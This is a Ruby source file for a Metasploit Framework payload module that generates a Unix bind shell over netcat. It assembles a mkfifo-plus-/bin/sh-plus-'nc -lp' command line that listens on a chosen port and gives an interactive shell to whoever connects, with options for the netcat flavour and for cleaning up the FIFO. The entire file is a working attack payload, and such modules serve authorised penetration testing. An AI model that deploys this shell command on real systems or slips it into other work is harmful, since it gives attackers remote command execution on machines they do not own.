##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Bind TCP (via netcat)',
        'Description' => 'Listen for a connection and spawn a command shell via netcat',
        'Author' => [
          'm-1-k-3',
          'egypt',
          'juan vazquez'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'netcat',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
        OptEnum.new('NetcatFlavor', [true, 'The flavor of Netcat to use', 'auto', ['auto', 'default', 'openbsd']]),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh']),
        OptString.new('FifoPath', [true, 'The path to the FIFO file to use, default is random', "/tmp/#{Rex::Text.rand_text_alpha_lower(4..7)}"]),
        OptBool.new('DeleteFifo', [true, 'Whether to delete the FIFO file after execution', true])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    nc_linux = "#{datastore['NetcatPath']} -lp #{datastore['LPORT']}"
    nc_openbsd = "#{datastore['NetcatPath']} -l #{datastore['LPORT']}"
    nc_auto = "(#{nc_linux} || #{nc_openbsd})"
    command = "mkfifo #{datastore['FifoPath']}; #{datastore['ShellPath']} -i <#{datastore['FifoPath']} 2>&1 |"
    case datastore['NetcatFlavor']
    when 'default'
      command += " #{nc_linux}"
    when 'openbsd'
      command += " #{nc_openbsd}"
    else
      command += " #{nc_auto}"
    end
    command += ">#{datastore['FifoPath']}"
    command += "; rm #{datastore['FifoPath']}" if datastore['DeleteFifo']
    command
  end
end
